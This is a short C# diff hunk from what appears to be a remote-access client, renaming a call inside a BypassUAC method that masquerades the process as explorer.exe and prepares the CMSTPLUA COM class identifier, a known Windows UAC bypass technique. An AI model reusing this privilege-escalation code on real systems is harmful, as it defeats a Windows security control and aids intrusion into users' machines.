@@ -113,7 +113,7 @@ namespace Client.Armitage.UAC
         }
         public static bool BypassUAC(string targetfile, string args)
         {
-            if (!_MasqueradePEB.MasqueradePEB(@"C:\Windows\explorer.exe")) return false;
+            if (!_MasqueradePEB.Do(@"C:\Windows\explorer.exe")) return false;
 
             // CLSID
             Guid classId_cmstplua = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
